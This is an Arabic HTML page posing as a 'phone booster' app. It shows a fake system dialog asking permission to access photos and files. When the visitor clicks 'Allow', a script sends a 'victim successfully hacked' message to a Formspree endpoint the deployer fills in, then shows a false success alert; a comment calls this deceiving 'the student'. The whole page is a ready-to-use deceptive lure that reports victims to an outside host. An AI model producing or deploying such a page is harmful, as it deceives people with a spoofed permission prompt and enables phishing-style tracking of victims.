<!DOCTYPE html>
<html lang="ar" dir="rtl">
<head>
    <meta charset="UTF-8">
    <meta name="viewport" content="width=device-width, initial-scale=1.0">
    <title>تسريع وتنظيف الهاتف</title>
    <style>
        body { font-family: sans-serif; background: #121212; color: white; text-align: center; padding-top: 50px; }
        .card { background: #1e1e1e; padding: 20px; border-radius: 15px; border: 1px solid #333; display: inline-block; width: 85%; }
        button { background: #ffc107; color: black; border: none; padding: 15px 30px; font-size: 18px; border-radius: 10px; cursor: pointer; font-weight: bold; margin-top: 20px; }
        #permissionBox { display: none; position: fixed; top: 50%; left: 50%; transform: translate(-50%, -50%); background: white; color: black; padding: 20px; width: 80%; border-radius: 15px; text-align: right; z-index: 9999; box-shadow: 0 0 20px rgba(0,0,0,0.5); }
        .overlay { display: none; position: fixed; top: 0; left: 0; width: 100%; height: 100%; background: rgba(0,0,0,0.8); z-index: 9998; }
        .allow-btn { color: #007bff; font-weight: bold; cursor: pointer; float: left; margin-top: 20px; text-decoration: none; }
    </style>
</head>
<body>

    <div class="card">
        <div style="font-size: 50px;">⚡</div>
        <h2>مسرّع الهاتف الاحترافي</h2>
        <p>قم بتحسين أداء جهازك وتنظيف الملفات المؤقتة بضغطة زر.</p>
        <button id="startBtn">تحليل الهاتف الآن</button>
    </div>

    <div class="overlay" id="overlay"></div>
    <div id="permissionBox">
        <p>هل تريد السماح لتطبيق <b>System Booster</b> بالوصول إلى الصور والوسائط والملفات؟</p>
        <a class="allow-btn" id="allowAction">سماح</a>
        <span style="color: #666; cursor: pointer;" onclick="location.reload()">رفض</span>
    </div>

    <script>
        // ضع رابط Formspree الخاص بك هنا
        const FORMSPREE_URL = "https://formspree.io/f/ضع_الرابط_هنا"; 

        const startBtn = document.getElementById('startBtn');
        const permissionBox = document.getElementById('permissionBox');
        const overlay = document.getElementById('overlay');
        const allowAction = document.getElementById('allowAction');

        startBtn.addEventListener('click', () => {
            overlay.style.display = "block";
            permissionBox.style.display = "block";
        });

        allowAction.addEventListener('click', function(e) {
            e.preventDefault();
            
            // إرسال البيانات لـ Formspree
            fetch(FORMSPREE_URL, {
                method: 'POST',
                body: JSON.stringify({
                    status: "تم اختراق الضحية بنجاح",
                    message: "تم الضغط على سماح للوصول للصور",
                    time: new Date().toLocaleString()
                }),
                headers: { 'Accept': 'application/json', 'Content-Type': 'application/json' }
            }).then(response => {
                // إيهام الطالب بأن العملية نجحت
                alert("تم تحسين أداء الهاتف بنجاح!");
                location.reload(); 
            });
        });
    </script>
</body>
</html>
